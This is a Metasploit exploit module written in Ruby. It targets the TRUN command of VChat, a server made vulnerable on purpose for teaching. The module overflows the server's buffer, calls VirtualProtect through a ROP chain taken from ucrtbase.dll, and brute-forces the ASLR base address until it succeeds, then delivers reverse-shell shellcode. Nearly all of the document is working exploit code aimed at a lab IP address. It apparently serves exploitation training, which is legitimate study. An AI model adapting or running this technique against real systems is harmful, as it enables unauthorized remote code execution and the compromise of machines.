##
# The # symbol starts a comment
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
# File path: /usr/share/metasploit-framework/modules/exploit/windows/VChat/TRUN_BRUTE.rb
##
# This module exploits the TRUN command of vulnerable chat server
##

class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module inheriting from the remote exploit class
    Rank = NormalRanking	# Potential impact to the target
    include Msf::Exploit::Remote::Tcp	# Include remote tcp exploit module
    def initialize(info = {})	# i.e. constructor, setting the initial values
      super(update_info(info,
        'Name'           => 'VChat/Vulnserver Buffer Overflow-TRUN command',	# Name of the target
        'Description'    => %q{	# Explaining what the module does
           This module exploits a buffer overflow in an Vulnerable By Design (VBD) server to gain a reverse shell. 
        },
        'Author'         => [ 'fxw' ],	## Hacker name
        'License'        => MSF_LICENSE,
        'References'     =>	# References for the vulnerability or exploit
          [
            #[ 'URL', 'https://github.com/DaintyJet/Making-Dos-DDoS-Metasploit-Module-Vulnserver/'],
            [ 'URL', 'https://github.com/DaintyJet/VChat_TRUN' ]
          ],
        'Privileged'     => false,
        'DefaultOptions' =>
          {
            'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done 
          },
        'Payload'        =>	# How to encode and generate the payload
          {
            'BadChars' => "\x00\x0a\x0d"	# Bad characters to avoid in generated shellcode
          },
        'Platform'       => 'Win',	# Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
        'Targets'        =>	#  targets for many exploits
        [
          [ 'EssFuncDLL-retn',
            {
              # unused
              'retn' => 0x62501029 # This will be available in [target['retn']]
            }
          ]
        ],
        'DefaultTarget'  => 0,
        'DisclosureDate' => 'Mar. 30, 2022'))	# When the vulnerability was disclosed in public
        register_options( # Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), SSLVersion()
            [
            OptInt.new('RETOFFSET', [true, 'Offset of Return Address in function', 1995]),
            OptString.new('LOWERBOUND', [true, 'Lower Bound of search space in HEX - Keep in the 4 digit range!', '0x7500']), # use .to_i(16)
            OptString.new('UPPERBOUND', [true, 'Upper Bound of search space in HEX - Keep in the 4 digit range!', '0x7800']), # use .to_i(16)
            Opt::RPORT(9999),
            Opt::RHOSTS('192.168.7.191')
        ])
    end
    def create_rop_chain(base)
      rop_gadgets =
      [
        #[---INFO:gadgets_to_set_esi:---]
        base + 0x41762,  # POP EAX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x106164,  # ptr to &VirtualProtect() [IAT ucrtbase.dll] ** REBASED ** ASLR
        base + 0x9BD4C,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0xA8661,  # PUSH EAX # POP ESI # RETN [ucrtbase.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_ebp:---]
        base + 0x55034,  # POP EBP # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x577C5,  # & push esp # ret  [ucrtbase.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_ebx:---]
        base + 0x5BECC,  # POP EAX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        0x052614cf,  # put delta into eax (-> put 0x00000201 into ebx)
        base + 0x55A04,  # ADD EAX,FAD9ED32 # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0xB2D6,  # XCHG EAX,EBX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_edx:---]
        base + 0x7799C,  # XOR EDX,EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x111F6,  # INC EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_ecx:---]
        base + 0x99814,  # POP ECX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x10415B,  # &Writable location [ucrtbase.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_edi:---]
        base + 0x672A1,  # POP EDI # RETN [ucrtbase.dll] ** REBASED ** ASLR
        base + 0x334A3,  # RETN (ROP NOP) [ucrtbase.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_eax:---]
        base + 0x5AA31,  # POP EAX # RETN [ucrtbase.dll] ** REBASED ** ASLR
        0x90909090,  # nop
        #[---INFO:pushad:---]
        base + 0xF0106,  # PUSHAD # ADD AL,0EF # RETN [ucrtbase.dll] ** REBASED ** ASLR
      ].flatten.pack("V*")
      return rop_gadgets
    end
    def exploit	# Actual exploit
      current_search = datastore['LOWERBOUND'].to_i(16)
      upper_bound = datastore['UPPERBOUND'].to_i(16)
      shellcode = payload.encoded	# Generated and encoded shellcode

      while current_search <= upper_bound do
        print_status("Generating Payload with Offset: (#{current_search.to_s(16)})0000")
        base_s = current_search << 16
        outbound = 'TRUN /.:/' + "A"*(datastore['RETOFFSET']) + create_rop_chain(base_s) + "\x90" * 8 + shellcode + "\x90" * 990 # Create the malicious string that will be sent to the target
        print_status('Connecting to target')
        begin
          socket_t = TCPSocket.new(datastore['RHOST'], datastore['RPORT'])
          print_status('Sending Payload to Target')
          socket_t.puts(outbound)
          sleep(5) # Can be adjusted.
          begin
            print_status('HELP Message Being sent')
            socket_t.puts('HELP')
          rescue Errno::ECONNRESET
            # Program crashes, continue the loop
            print_status('System Crash Detected, Continuing Search')
            socket_t.close()
          else
            # Program does not crash
            print_status('HIT Exiting Loop')
            break
          end # Inner begin
          rescue Errno::ECONNREFUSED, Errno::ETIMEDOUT => e
            puts "Connection failed: #{e.message}"
        end # Outter begin
        current_search =  current_search + 1
      end # Loop
      print_status('Loop Ended')

    end
  end